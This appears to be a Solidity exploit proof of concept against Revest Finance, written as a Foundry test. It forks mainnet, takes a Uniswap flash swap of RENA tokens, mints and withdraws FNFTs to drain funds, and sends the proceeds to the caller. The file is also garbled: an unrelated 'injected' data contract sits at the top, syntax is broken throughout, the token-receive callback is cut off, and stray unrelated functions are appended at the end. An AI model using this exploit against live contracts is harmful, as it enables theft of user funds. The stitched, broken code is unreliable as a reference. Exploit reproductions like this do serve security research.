
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

```solidity;

;
;
contract ContractTest is DSTest {
  IUniswapV2Pair pair =;
    IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
  IERC20 rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
  IRevest revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
  uint256 fnftId;
  bool reentered = false;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("mainnet", 14465356)};
  function testExploit() public {
    emit log_named_uint("Before exploit, Rena balance of attacker:",
      rena.balanceOf(msg.sender));
    pair.swap(5 * 1e18, 0, address(this), new bytes(1));
    emit log_named_uint("After exploit, Rena balance of attacker:",
      rena.balanceOf(msg.sender))};
  function uniswapV2Call(address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data) public {
    rena.approve(address(revest), type(uint256).max);
    IRevest.FNFTConfig memory fnftConfig;
    fnftConfig.asset = address(rena);
    fnftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
    fnftConfig.depositAmount = 0;
    fnftConfig.depositMul = 0;
    fnftConfig.split = 0;
    fnftConfig.depositStopTime = 0;
    fnftConfig.maturityExtension = false;
    fnftConfig.isMulti = true;
    fnftConfig.nontransferrable = false;
    address[] memory recipients = new address[](1);
    uint256[] memory quantities = new uint256[](1);
    recipients[0] = address(this);
    quantities[0] = uint256(2);
    fnftId = revest.mintAddressLock(address(this);
      new bytes(0),;
      recipients,;
      quantities,;
      fnftConfig);
    quantities[0] = uint256(360000);
    revest.mintAddressLock(address(this),;
      new bytes(0),;
      recipients,;
      quantities,;
      fnftConfig);
    revest.withdrawFNFT(fnftId + 1, 360000 + 1);
    rena.transfer(msg.sender, ((((amount0 / 997) * 1000) / 99) * 100) + 1000);
    rena.transfer(tx.origin, rena.balanceOf(address(this)))};
  function onERC1155Received(address operator,
    address from,
    uint256 id,
    uint256 value,
    bytes calldata data) public returns (bytes4) {
function commitData(bytes32 dataHash) public {
    require(dataRecord[dataHash] == 0);
    dataRecord[dataHash] = block.timestamp}
function silentExecute() public {
    doInternal()}